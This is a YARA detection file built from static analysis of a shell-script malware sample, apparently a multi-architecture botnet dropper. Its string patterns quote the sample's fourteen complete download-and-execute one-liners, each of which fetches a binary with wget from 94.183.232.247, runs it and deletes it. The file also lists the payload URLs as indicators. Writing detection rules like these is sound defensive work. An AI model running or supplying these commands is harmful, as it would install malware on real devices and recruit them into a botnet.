import "hash"

rule Single_Sample_Static_33b554e0ba3a5c40
{
  meta:
    source = "loop-engineering single-sample static analysis"
    analysis = "static only; sample not executed"
    sha256 = "33b554e0ba3a5c402fe0442d2f98e72d18f5cb9e2c4ead4bfa6d1a0fe9bfb482"
    md5 = "127d91b5a6b945bf7f4111745d786e1a"
    sha1 = "74c798eece8ac8486b418db8b57f265fa47236ed"
    file_magic = "script with shebang"
    malwarebazaar_family = "unknown"
  strings:
    $s01 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/mips; chmod +x mips; ./mips; rm -rf mips" nocase
    $s02 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel" nocase
    $s03 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/sh4; chmod +x sh4; ./sh4; rm -rf sh4" nocase
    $s04 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/x86; chmod +x x86; ./x86; rm -rf x86" nocase
    $s05 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/i686; chmod +x i686; ./i686; rm -rf i686" nocase
    $s06 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/ppc; chmod +x ppc; ./ppc; rm -rf ppc" nocase
    $s07 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/i586; chmod +x i586; ./i586; rm -rf i586" nocase
    $s08 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/m68k; chmod +x m68k; ./m68k; rm -rf m68k" nocase
    $s09 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/sparc; chmod +x sparc; ./sparc; rm -rf sparc" nocase
    $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/arm; chmod +x arm; ./arm; rm -rf arm" nocase
    $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/arm4; chmod +x arm4; ./arm4; rm -rf arm4" nocase
    $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/arm5; chmod +x arm5; ./arm5; rm -rf arm5" nocase
    $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/arm6; chmod +x arm6; ./arm6; rm -rf arm6" nocase
    $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/arm7; chmod +x arm7; ./arm7; rm -rf arm7" nocase
  condition:
    hash.sha256(0, filesize) == "33b554e0ba3a5c402fe0442d2f98e72d18f5cb9e2c4ead4bfa6d1a0fe9bfb482" or 2 of ($s*)
}

rule Static_Source_Malware_Indicators
{
  meta:
    source = "loop-engineering static source analysis"
    language_hint = "shell"
    analysis = "static text only; sample not executed"
  strings:
    $url_01 = "http://94.183.232.247/arm" nocase
    $url_02 = "http://94.183.232.247/arm4" nocase
    $url_03 = "http://94.183.232.247/arm5" nocase
    $url_04 = "http://94.183.232.247/arm6" nocase
    $url_05 = "http://94.183.232.247/arm7" nocase
    $url_06 = "http://94.183.232.247/i586" nocase
    $url_07 = "http://94.183.232.247/i686" nocase
    $url_08 = "http://94.183.232.247/m68k" nocase
    $url_09 = "http://94.183.232.247/mips" nocase
    $url_10 = "http://94.183.232.247/mipsel" nocase
    $url_11 = "http://94.183.232.247/ppc" nocase
    $url_12 = "http://94.183.232.247/sh4" nocase
    $url_13 = "http://94.183.232.247/sparc" nocase
    $url_14 = "http://94.183.232.247/x86" nocase
    $ip_15 = "94.183.232.247" nocase
  condition:
    any of them
}
